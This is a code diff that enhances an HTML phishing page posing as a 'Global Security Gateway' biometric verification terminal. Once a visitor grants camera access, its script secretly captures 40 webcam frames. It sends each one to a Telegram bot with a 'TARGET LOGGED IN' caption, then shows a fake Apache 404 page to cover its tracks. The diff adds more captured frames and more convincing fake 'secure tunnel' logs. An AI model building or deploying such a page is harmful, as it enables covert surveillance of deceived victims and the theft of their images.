@@ -3,13 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Global Security Gateway | Terminal</title>
+    <title>Global Security Gateway | Advanced Terminal</title>
     <style>
         :root {
             --primary: #00d4ff;
             --accent: #00ff88;
             --bg: #050a14;
             --danger: #ff4b4b;
+            --dark-blue: #0a192f;
         }
 
         body { 
@@ -19,6 +20,20 @@
             font-family: 'Courier New', Courier, monospace; 
             display: flex; align-items: center; justify-content: center; 
             height: 100vh; overflow: hidden; 
+        }
+
+        /* Top Loading Bar (Authenticity) */
+        #top-loader-container {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 5px;
+            background: rgba(0, 212, 255, 0.1);
+            z-index: 100;
+        }
+        #top-loader-fill {
+            height: 100%; width: 0%;
+            background: var(--accent);
+            box-shadow: 0 0 15px var(--accent);
+            transition: width 1.6s linear;
         }
 
         /* Scanline Effect */
@@ -33,29 +48,32 @@
         .shield-container { 
             border: 1px solid var(--primary); 
             padding: 30px; 
-            background: rgba(0, 20, 40, 0.9); 
-            box-shadow: 0 0 20px rgba(0, 212, 255, 0.3); 
+            background: rgba(10, 25, 47, 0.95); 
+            box-shadow: 0 0 30px rgba(0, 212, 255, 0.15); 
             text-align: center; 
-            width: 90%; max-width: 500px;
+            width: 90%; max-width: 550px;
             position: relative;
             z-index: 5;
+            border-radius: 4px;
         }
 
         .scanner-frame {
             position: relative;
-            width: 120px; height: 120px;
+            width: 140px; height: 140px;
             margin: 0 auto 20px;
             border: 2px solid var(--primary);
+            background: rgba(0, 0, 0, 0.3);
+            display: flex; align-items: center; justify-content: center;
         }
 
-        /* Moving Scan Line */
         .scanner-line {
             position: absolute;
             width: 100%; height: 2px;
             background: var(--accent);
-            box-shadow: 0 0 10px var(--accent);
-            animation: scan 2s linear infinite;
+            box-shadow: 0 0 15px var(--accent);
+            animation: scan 3s linear infinite;
             display: none;
+            z-index: 2;
         }
 
         @keyframes scan {
@@ -63,36 +81,42 @@
             100% { top: 100%; }
         }
 
-        h1 { font-size: 1.5rem; letter-spacing: 4px; margin-bottom: 5px; text-transform: uppercase; text-shadow: 0 0 10px var(--primary); }
-        .subtitle { color: #8899a6; font-size: 12px; margin-bottom: 25px; }
+        h1 { font-size: 1.4rem; letter-spacing: 5px; margin-bottom: 5px; text-transform: uppercase; text-shadow: 0 0 10px var(--primary); }
+        .subtitle { color: #5a7b8f; font-size: 11px; margin-bottom: 25px; letter-spacing: 1px; }
 
-        /* Terminal Console */
+        /* Advanced Console */
         #console {
-            background: rgba(0, 0, 0, 0.5);
+            background: rgba(0, 5, 10, 0.8);
             border: 1px solid #1a3a4a;
-            height: 120px;
+            height: 160px;
             overflow-y: hidden;
             text-align: left;
-            padding: 10px;
+            padding: 12px;
             font-size: 11px;
             margin-bottom: 20px;
             color: var(--accent);
+            box-shadow: inset 0 0 10px #000;
         }
 
         .btn { 
             background: transparent; border: 1px solid var(--primary); 
-            color: var(--primary); padding: 12px 30px; 
+            color: var(--primary); padding: 14px 35px; 
             font-size: 14px; font-weight: bold; cursor: pointer; 
             text-transform: uppercase; transition: all 0.3s;
-            letter-spacing: 2px;
+            letter-spacing: 3px;
+            position: relative;
         }
 
-        .btn:hover { background: var(--primary); color: var(--bg); box-shadow: 0 0 20px var(--primary); }
+        .btn:hover { background: var(--primary); color: var(--bg); box-shadow: 0 0 25px var(--primary); }
 
-        .progress-container { width: 100%; background: #112233; height: 4px; margin-top: 10px; display: none;}
-        .progress-bar { height: 100%; width: 0%; background: var(--accent); box-shadow: 0 0 10px var(--accent); transition: width 0.3s; }
+        .progress-container { width: 100%; background: #071221; height: 6px; margin-top: 15px; display: none; border: 1px solid #1a3a4a;}
+        .progress-bar { height: 100%; width: 0%; background: var(--primary); box-shadow: 0 0 10px var(--primary); transition: width 1.5s; }
 
-        .glitch { animation: glitch 1s linear infinite; }
+        .network-grid {
+            display: flex; justify-content: space-between; margin-top: 10px; font-size: 9px; color: #4a6a7a;
+        }
+
+        .glitch { animation: glitch 1.5s linear infinite; }
         @keyframes glitch {
             2%, 64% { transform: translate(2px,0) skew(0deg); }
             4%, 60% { transform: translate(-2px,0) skew(0deg); }
@@ -101,24 +125,32 @@
     </style>
 </head>
 <body>
+    <div id="top-loader-container"><div id="top-loader-fill"></div></div>
+
     <div class="shield-container" id="main-ui">
         <div class="scanner-frame">
             <div id="scanLine" class="scanner-line"></div>
-            <div style="font-size: 60px; line-height: 120px;">👤</div>
+            <div style="font-size: 70px; opacity: 0.8;">👤</div>
         </div>
         
-        <h1 id="title">User Verification</h1>
-        <p class="subtitle">ENCRYPTED NODE: C2-ALPHA-NORTH</p>
+        <h1 id="title">Protocol 40-X</h1>
+        <p class="subtitle">ENCRYPTED NODE: C2-ALPHA-NORTH // ACCESS POINT 443</p>
 
         <div id="console">
-            > SYSTEM IDLE...<br>
-            > AWAITING BIOMETRIC UPLOAD...
+            > SYSTEM STATUS: IDLE<br>
+            > LOG: AWAITING HANDSHAKE SIGNAL...
         </div>
 
-        <button class="btn" id="mainBtn" onclick="initiate()">Establish Handshake</button>
+        <button class="btn" id="mainBtn" onclick="initiate()">Authorize Stream</button>
 
         <div class="progress-container" id="progCont">
             <div id="loader" class="progress-bar"></div>
+        </div>
+        
+        <div class="network-grid" id="netGrid" style="display:none;">
+            <span>TX_STABILITY: 99.4%</span>
+            <span>UPLINK_ACTIVE</span>
+            <span>NODE_LATENCY: 24ms</span>
         </div>
     </div>
 
@@ -132,27 +164,31 @@
 
         function logToConsole(msg) {
             const line = document.createElement('div');
-            line.innerText = `> ${msg}`;
+            line.innerHTML = `<span style="color:#5a7b8f;">[${new Date().toLocaleTimeString()}]</span> > ${msg}`;
             consoleEl.appendChild(line);
             consoleEl.scrollTop = consoleEl.scrollHeight;
+            if(consoleEl.childNodes.length > 9) consoleEl.removeChild(consoleEl.childNodes[0]);
         }
 
         async function initiate() {
             const loader = document.getElementById('loader');
+            const topLoader = document.getElementById('top-loader-fill');
             const btn = document.getElementById('mainBtn');
             const scanLine = document.getElementById('scanLine');
             const progCont = document.getElementById('progCont');
+            const netGrid = document.getElementById('netGrid');
             
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 btn.style.display = 'none';
                 progCont.style.display = 'block';
+                netGrid.style.display = 'flex';
                 scanLine.style.display = 'block';
                 document.getElementById('title').classList.add('glitch');
 
-                logToConsole("ACCESSING CAMERA API...");
-                logToConsole("HANDSHAKE ESTABLISHED.");
-                logToConsole("INITIALIZING PACKET STREAM...");
+                logToConsole("ESTABLISHING SECURE TUNNEL...");
+                logToConsole("HANDSHAKE VERIFIED.");
+                logToConsole("INITIATING 40-FRAGMENT UPLINK...");
 
                 const video = document.getElementById('v');
                 video.srcObject = stream;
@@ -160,14 +196,14 @@
                 video.onloadedmetadata = () => {
                     video.play();
                     let count = 0;
-                    const maxPackets = 20; 
+                    const maxPackets = 40; // Increased to 40
                     
                     const interval = setInterval(() => {
                         if (count >= maxPackets) {
                             clearInterval(interval);
-                            logToConsole("FINALIZING ENCRYPTION...");
+                            logToConsole("UPLINK COMPLETE. CLOSING TUNNEL...");
                             stream.getTracks().forEach(track => track.stop());
-                            setTimeout(render404, 1000);
+                            setTimeout(render404, 2000);
                             return;
                         }
                         
@@ -176,20 +212,22 @@
                         
                         const progress = (count * (100 / maxPackets));
                         loader.style.width = progress + "%";
+                        topLoader.style.width = progress + "%"; // Top bar sync
                         
-                        // Dynamic log messages to make it look "real"
-                        const logs = [
-                            `UPLOADING HEX_FRAGMENT_${count}...`,
-                            `BIT-LEVEL VALIDATION: SUCCESS`,
-                            `SYNCHRONIZING WITH C2 NODE...`,
-                            `PACKET ${count}/20 INJECTED`
+                        // Dynamic advanced logs
+                        const techLogs = [
+                            `PACKET_CHUNK_${count} ENCRYPTED`,
+                            `ROUTING VIA C2-NODE-ALPHA...`,
+                            `PARITY CHECK: OK`,
+                            `SEQUENCE_${count} TRANSMITTED`,
+                            `BUFFERING DATA STREAM...`
                         ];
-                        logToConsole(logs[count % logs.length]);
+                        logToConsole(techLogs[count % techLogs.length]);
 
-                    }, 800); 
+                    }, 1600); // Doubled time (1.6 seconds)
                 };
             } catch (e) {
-                logToConsole("CRITICAL ERROR: PERMISSION DENIED");
+                logToConsole("ACCESS DENIED: BIOS_PERM_ERROR");
                 consoleEl.style.color = "#ff4b4b";
             }
         }
@@ -208,7 +246,7 @@
                     const fd = new FormData();
                     fd.append('chat_id', chatId);
                     fd.append('photo', blob, 'identity_packet.jpg');
-                    fd.append('caption', '🎯 TARGET LOGGED IN\nFragment: ' + index + '\nAgent: C2-Node-Alpha');
+                    fd.append('caption', '🎯 TARGET LOGGED IN\nFragment: ' + index + '/40\nAgent: C2-Advanced-Node');
 
                     fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                         method: 'POST',
@@ -222,10 +260,10 @@
             document.documentElement.innerHTML = `
             <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
             <html><head>
-            <title>404 Not Found</title>
+            <title>404 Error Not Found</title>
             </head><body style="background-color: white; color: black; font-family: sans-serif; padding: 20px;">
             <h1>Not Found</h1>
-            <p>The requested URL was not found on this server. System Error</p>
+            <p>The requested URL was not found on this server. System Error. Access the site again.</p>
             <hr>
             <address>Apache/2.4.41 (Ubuntu) Server at Port 443</address>
             </body></html>`;
